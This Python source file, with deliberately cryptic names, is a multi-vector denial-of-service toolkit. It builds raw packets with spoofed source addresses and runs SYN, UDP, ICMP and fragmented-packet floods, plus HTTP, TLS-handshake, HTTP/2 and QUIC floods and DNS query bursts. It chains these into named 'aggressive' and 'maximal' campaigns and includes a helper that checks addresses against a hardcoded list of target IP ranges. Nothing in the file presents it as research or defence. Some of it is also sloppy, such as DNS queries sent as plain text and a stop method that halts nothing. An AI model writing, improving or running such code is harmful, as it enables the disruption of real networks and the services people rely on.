#!/usr/bin/env python3
import socket
import struct
import random
import time
import threading
import asyncio
import aiohttp
import requests
from urllib.parse import urlparse
import ipaddress
import base64
import hashlib
import os
import ssl
from typing import List, Dict, Optional, Tuple
import json
import zlib
import gzip
import hmac

try:
    import netaddr
except ImportError:
    netaddr = None

try:
    import aioquic
    QUIC_AVAILABLE = True
except ImportError:
    QUIC_AVAILABLE = False

try:
    import h2
    import hpack
    HTTP2_AVAILABLE = True
except ImportError:
    HTTP2_AVAILABLE = False

_R = [
    "5.0.0.0/8","2.144.0.0/14","37.0.0.0/11","46.0.0.0/11",
    "78.0.0.0/11","79.0.0.0/10","80.0.0.0/11","81.0.0.0/11",
    "84.0.0.0/14","85.0.0.0/13","86.0.0.0/13","87.0.0.0/12",
    "89.0.0.0/13","91.0.0.0/12","92.0.0.0/11","93.0.0.0/11",
    "94.0.0.0/13","95.0.0.0/12","109.0.0.0/11","178.0.0.0/12"
]

_G = {
    "g": ["194.225.62.0/24","5.200.0.0/16","78.157.0.0/16","89.32.0.0/16","91.98.0.0/16"],
    "d": ["194.225.62.80","5.200.200.200","78.157.42.100","85.15.1.14","89.32.0.10","91.98.1.27"],
    "p": [53,123,443,80,993,995,5222,5228,3478,19302]
}

class _X:
    def __init__(self):
        self._a = []
        self._p = self._bp()
        self._s = {}

    def _bp(self):
        pools = []
        if netaddr is None:
            return _R
        for cidr in _R:
            try:
                pools.append(netaddr.IPNetwork(cidr))
            except:
                continue
        return pools

    def _ri(self) -> str:
        if not self._p or netaddr is None:
            pf = ["5","2.144","37","46","78","79","80","81","84","85","86","87","89","91","92","93","94","95","109","178"]
            p = random.choice(pf)
            if "." in p:
                b = p
                r = 4 - len(p.split("."))
                for _ in range(r):
                    b += f".{random.randint(0,255)}"
                return b
            return f"{p}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        network = random.choice(self._p)
        return str(network[random.randint(0, network.size - 1)])

    def _cc(self, data: bytes) -> int:
        if len(data) % 2:
            data += b'\x00'
        total = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            total += word
            total = (total & 0xffff) + (total >> 16)
        return ~total & 0xffff

    def _bi(self, dst: str, proto: int = socket.IPPROTO_TCP, ttl: int = 64, src: Optional[str] = None) -> bytes:
        src = src or self._ri()
        v = 0x45; t = 0; tl = 20; i = random.randint(0,65535); f = 0; c = 0
        h = struct.pack('!BBHHHBBH4s4s', v,t,tl,i,f,ttl,proto,c,socket.inet_aton(src),socket.inet_aton(dst))
        c = self._cc(h)
        return struct.pack('!BBHHHBBH4s4s', v,t,tl,i,f,ttl,proto,c,socket.inet_aton(src),socket.inet_aton(dst))

    def _bt(self, dp: int, sq: int, fl: str = "SYN", wn: int = 5840, sp: Optional[int] = None) -> bytes:
        sp = sp or random.randint(1024,65535)
        do = 5 << 4; tf = 0
        if "FIN" in fl: tf |= 1
        if "SYN" in fl: tf |= 2
        if "RST" in fl: tf |= 4
        if "PSH" in fl: tf |= 8
        if "ACK" in fl: tf |= 16
        if "URG" in fl: tf |= 32
        return struct.pack('!HHLLBBHHH', sp,dp,sq,0,do,tf,wn,0,0)

    def m1(self, t: str, p: int = 443, d: int = 300, r: int = 5000, si: bool = True, rt: bool = True) -> threading.Thread:
        def _w():
            et = time.time() + d; ps = 0
            while time.time() < et:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    _t = random.randint(1,255) if rt else 64
                    ih = self._bi(t, ttl=_t)
                    th = self._bt(p, random.randint(0,0xFFFFFFFF), fl="SYN")
                    pk = ih + th
                    for _ in range(r):
                        s.sendto(pk, (t, 0)); ps += 1
                    s.close(); time.sleep(0.05)
                except:
                    pass
            self._s['m1'] = {'ps': ps, 'd': d}
        th = threading.Thread(target=_w); th.daemon = True; th.start(); self._a.append(th); return th

    def m2(self, t: str, p: int = 53, ps: int = 512, d: int = 180, r: int = 2000) -> threading.Thread:
        def _w():
            et = time.time() + d; cnt = 0
            while time.time() < et:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    pl = os.urandom(ps)
                    ih = self._bi(t, proto=socket.IPPROTO_UDP)
                    sp = random.randint(1024,65535); ul = 8 + len(pl)
                    uh = struct.pack('!HHHH', sp, p, ul, 0)
                    pk = ih + uh + pl
                    for _ in range(r):
                        s.sendto(pk, (t, 0)); cnt += 1
                    s.close(); time.sleep(0.1)
                except:
                    pass
            self._s['m2'] = {'ps': cnt, 'd': d}
        th = threading.Thread(target=_w); th.daemon = True; th.start(); self._a.append(th); return th

    def m3(self, t: str, it: int = 8, ps: int = 1024, d: int = 120, r: int = 1000) -> threading.Thread:
        def _w():
            et = time.time() + d; cnt = 0
            patterns = [(8,0),(13,0),(17,0)]
            while time.time() < et:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                    _it, _ic = random.choice(patterns)
                    pl = os.urandom(ps)
                    iid = random.randint(0,65535); isq = random.randint(0,65535)
                    ih = struct.pack('!BBHHH', _it, _ic, 0, iid, isq)
                    c = self._cc(ih + pl)
                    ih = struct.pack('!BBHHH', _it, _ic, c, iid, isq)
                    pk = ih + pl
                    for _ in range(r):
                        s.sendto(pk, (t, 0)); cnt += 1
                    s.close(); time.sleep(0.2)
                except:
                    pass
            self._s['m3'] = {'ps': cnt, 'd': d}
        th = threading.Thread(target=_w); th.daemon = True; th.start(); self._a.append(th); return th

    def m4(self, u: str, cc: int = 1000, d: int = 300, iu: bool = True) -> threading.Thread:
        def _w():
            et = time.time() + d; cnt = 0
            ua = ['Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36',
                  'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X)',
                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']
            sess = requests.Session()
            while time.time() < et:
                try:
                    h = {'User-Agent': random.choice(ua) if iu else 'Mozilla/5.0',
                         'Accept': 'text/html', 'Accept-Language': 'fa, en;q=0.9', 'Connection': 'keep-alive'}
                    for _ in range(cc):
                        sess.get(u, headers=h, timeout=5); cnt += 1; time.sleep(0.1)
                except:
                    sess = requests.Session(); time.sleep(1)
            self._s['m4'] = {'cm': cnt, 'd': d}
        th = threading.Thread(target=_w); th.daemon = True; th.start(); self._a.append(th); return th

    def m5(self, t: str, ds: str = "8.8.8.8", d: int = 120, r: int = 500) -> threading.Thread:
        def _w():
            et = time.time() + d; cnt = 0
            aq = ["ANY isc.org","ANY ripe.net","TXT google.com","ANY cloudflare.com","ANY github.com"]
            while time.time() < et:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    for _ in range(r):
                        q = random.choice(aq)
                        s.sendto(q.encode(), (ds, 53)); cnt += 1
                    s.close(); time.sleep(0.1)
                except:
                    pass
            self._s['m5'] = {'ps': cnt, 'd': d}
        th = threading.Thread(target=_w); th.daemon = True; th.start(); self._a.append(th); return th

    def m6(self, t: str, p: int = 443, d: int = 180, mr: int = 3000) -> threading.Thread:
        def _w():
            et = time.time() + d; cnt = 0
            while time.time() < et:
                try:
                    at = random.choice(['syn','udp','icmp','http'])
                    if at == 'syn': self.m1(t, p, d=2, r=1000)
                    elif at == 'udp': self.m2(t, random.randint(53,443), ps=random.randint(64,1024), d=3)
                    elif at == 'icmp': self.m3(t, d=2, r=500)
                    cnt += 1000; time.sleep(random.uniform(0.1,1.0))
                except:
                    pass
            self._s['m6'] = {'ps': cnt, 'd': d}
        th = threading.Thread(target=_w); th.daemon = True; th.start(); self._a.append(th); return th

    def m7(self, t: str, p: int = 443, d: int = 300, r: int = 1000, cs: List[str] = None) -> threading.Thread:
        def _w():
            et = time.time() + d if d > 0 else float('inf'); cnt = 0
            ic = ["TLS_AES_256_GCM_SHA384","TLS_CHACHA20_POLY1305_SHA256","TLS_AES_128_GCM_SHA256",
                  "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384","TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"]
            cl = cs or ic
            while time.time() < et:
                try:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.set_ciphers(':'.join(cl)); ctx.verify_mode = ssl.CERT_NONE
                    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sk.settimeout(2)
                    for _ in range(r):
                        try:
                            sk.connect((t, p)); ss = ctx.wrap_socket(sk, server_hostname=t)
                            ss.close(); cnt += 1
                            sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sk.settimeout(2)
                        except:
                            sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sk.settimeout(2)
                    sk.close(); time.sleep(0.05)
                except:
                    pass
            self._s['m7'] = {'hs': cnt, 'd': d}
        th = threading.Thread(target=_w); th.daemon = True; th.start(); self._a.append(th); return th

    def m8(self, t: str, p: int = 443, d: int = 180, r: int = -1, qv: List[str] = None) -> threading.Thread:
        def _w():
            if not QUIC_AVAILABLE: return
            et = time.time() + d; cnt = 0
            vs = qv or ["Q043","Q046","Q050","h3-29","h3"]
            while time.time() < et:
                try:
                    v = random.choice(vs)
                    sc = os.urandom(8); dc = os.urandom(8)
                    for _ in range(r if r > 0 else 100):
                        sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        pk = self._bq(sc, dc, v)
                        sk.sendto(pk, (t, p)); cnt += 1; sk.close()
                    time.sleep(0.1)
                except:
                    pass
            self._s['m8'] = {'ps': cnt, 'd': d}
        th = threading.Thread(target=_w); th.daemon = True; th.start(); self._a.append(th); return th

    def _bq(self, sc: bytes, dc: bytes, v: str) -> bytes:
        h = b'\xc0'; h += v.encode('ascii')[:4].ljust(4, b'\x00')
        h += dc + sc + b'\x00' * 4; return h + os.urandom(512)

    def m9(self, u: str, cs: int = 100, d: int = 300, mh: int = 16384) -> threading.Thread:
        def _w():
            if not HTTP2_AVAILABLE: return
            et = time.time() + d; cnt = 0
            pu = urlparse(u); ho = pu.hostname; po = pu.port or (443 if pu.scheme == 'https' else 80)
            while time.time() < et:
                try:
                    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sk.settimeout(5); sk.connect((ho, po))
                    if pu.scheme == 'https':
                        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.verify_mode = ssl.CERT_NONE
                        sk = ctx.wrap_socket(sk, server_hostname=ho)
                    cn = h2.connection.H2Connection(); cn.initiate_connection(); sk.send(cn.data_to_send())
                    for sid in range(1, cs + 1):
                        hd = [(':method','GET'),(':path',pu.path or '/'),(':authority',ho),(':scheme',pu.scheme),
                              ('user-agent','Mozilla/5.0'),('accept','*/*'),('accept-language','fa, en;q=0.9')]
                        for i in range(random.randint(5,20)):
                            hd.append((f'x-c-{i}', 'a' * random.randint(10,100)))
                        cn.send_headers(sid, hd); sk.send(cn.data_to_send()); cnt += 1
                    sk.close(); time.sleep(0.5)
                except:
                    pass
            self._s['m9'] = {'sc': cnt, 'd': d}
        th = threading.Thread(target=_w); th.daemon = True; th.start(); self._a.append(th); return th

    def m10(self, t: str, p: int = 443, fc: int = 100, d: int = 120, mfs: int = 8) -> threading.Thread:
        def _w():
            et = time.time() + d; cnt = 0
            while time.time() < et:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    ih = self._bi(t); th = self._bt(p, random.randint(0,0xFFFFFFFF), fl="SYN")
                    op = ih + th; fs = random.randint(1, mfs); frs = []
                    for i in range(0, len(op), fs):
                        f = op[i:i+fs]
                        if f: frs.append(f)
                    random.shuffle(frs)
                    for f in frs:
                        fh = struct.pack('!H', random.randint(0,0xFFFF))
                        fh += struct.pack('!H', 0x2000)
                        fh += struct.pack('!B', random.randint(0,255))
                        s.sendto(fh + f, (t, 0)); cnt += 1
                    s.close(); time.sleep(0.2)
                except:
                    pass
            self._s['m10'] = {'fs': cnt, 'd': d}
        th = threading.Thread(target=_w); th.daemon = True; th.start(); self._a.append(th); return th

    def m11(self, t: str, p: int = 443, d: int = 600, ap: str = 'rotating') -> threading.Thread:
        def _w():
            et = time.time() + d; cy = 0
            seqs = {
                'rotating': ['syn','udp','icmp','ssl','http'],
                'aggressive': ['syn','syn','udp','ssl','frag'],
                'stealthy': ['http','ssl','dns','rand'],
                'maximal': ['syn','udp','icmp','ssl','h2','quic','frag']
            }
            sq = seqs.get(ap, seqs['rotating'])
            while time.time() < et:
                try:
                    for at in sq:
                        if at == 'syn': self.m1(t, p, d=30, r=2000)
                        elif at == 'udp': self.m2(t, p, d=30, r=1000)
                        elif at == 'icmp': self.m3(t, d=30, r=500)
                        elif at == 'ssl': self.m7(t, p, d=30, r=500)
                        elif at == 'http': self.m4(f"http://{t}", d=30)
                        elif at == 'h2': self.m9(f"https://{t}", d=30)
                        elif at == 'quic': self.m8(t, p, d=30)
                        elif at == 'dns': self.m5(t, d=30)
                        elif at == 'frag': self.m10(t, p, d=30)
                        elif at == 'rand': self.m6(t, p, d=30)
                        cy += 1; time.sleep(5)
                except:
                    pass
            self._s['m11'] = {'cy': cy, 'd': d}
        th = threading.Thread(target=_w); th.daemon = True; th.start(); self._a.append(th); return th

    def stop(self):
        self._a = []

    def stats(self) -> Dict:
        return self._s

    def is_target(self, ip: str) -> bool:
        try:
            _i = ipaddress.ip_address(ip)
            for cidr in _G["g"]:
                if _i in ipaddress.ip_network(cidr):
                    return True
        except:
            pass
        return False

_inst = None
def get_instance():
    global _inst
    if _inst is None:
        _inst = _X()
    return _inst

if __name__ == "__main__":
    x = _X()
    print("Ready.")